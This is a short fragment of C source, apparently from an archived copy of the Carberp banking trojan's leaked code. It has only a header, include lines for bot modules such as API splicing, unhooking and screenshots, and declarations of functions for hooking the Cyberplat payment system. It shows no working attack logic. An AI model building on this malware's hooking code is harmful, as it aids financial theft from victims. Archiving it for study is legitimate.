/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Modules.h"


#include <windows.h>
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Splice.h"

#include "Utils.h"
#include "BotUtils.h"
#include "Screens.h"
#include "Inist.h"
#include "Unhook.h"
#include "Trade.h"

void HookCyberplat();
bool HookCyberplatPC();

